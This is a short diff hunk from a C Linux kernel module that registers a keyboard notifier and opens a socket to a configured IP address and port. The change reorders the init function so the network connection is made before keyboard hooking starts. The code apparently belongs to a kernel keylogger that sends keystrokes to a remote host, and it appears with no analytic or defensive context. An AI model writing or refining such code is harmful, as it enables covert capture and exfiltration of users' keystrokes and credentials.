@@ -54,16 +54,16 @@ int keyboard_notifier_callback(struct notifier_block *nblock, unsigned long code
 static int __init keyboard_module_init(void) {
     int result;
 
+    result = create_socket(IP_ADDRESS, PORT);
+    if (result < 0) {
+        printk(KERN_ERR "Failed to connect\n");
+        return result;
+    }
+
     // Register the keyboard notifier
     result = register_keyboard_notifier(&keyboard_notifier_block);
     if (result != 0) {
         printk(KERN_ERR "Failed to register keyboard notifier\n");
-        return result;
-    }
-
-    result = create_socket(IP_ADDRESS, PORT);
-    if (result < 0) {
-        printk(KERN_ERR "Failed to connect\n");
         return result;
     }
 
